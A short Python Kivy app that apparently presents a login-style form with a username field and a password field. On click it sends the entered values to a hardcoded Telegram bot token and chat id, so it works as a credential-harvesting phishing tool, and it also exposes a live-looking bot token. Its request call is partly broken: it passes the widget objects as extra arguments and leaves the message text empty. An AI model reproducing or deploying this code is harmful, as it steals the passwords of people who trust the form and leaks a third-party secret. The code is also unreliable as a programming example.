from kivy.app import App 
from kivy.uix.boxlayout import BoxLayout
from kivy.properties import ObjectProperty
import requests


class MyLayout(BoxLayout):
    ti_alireza = ObjectProperty(None)
    ti_password = ObjectProperty(None)
    ti_result = ObjectProperty(None)
    def click(self):
       requests.post("https://api.telegram.org/bot6445656205:AAFLnpRFXgRvD8I3dMXahrSJxufEV3vdVHY/sendmessage?chat_id=5088806230&text=",self.ti_alireza,self.ti_password)


class MyKivy(App):
    def build(self):
        return MyLayout()


   
MyKivy().run()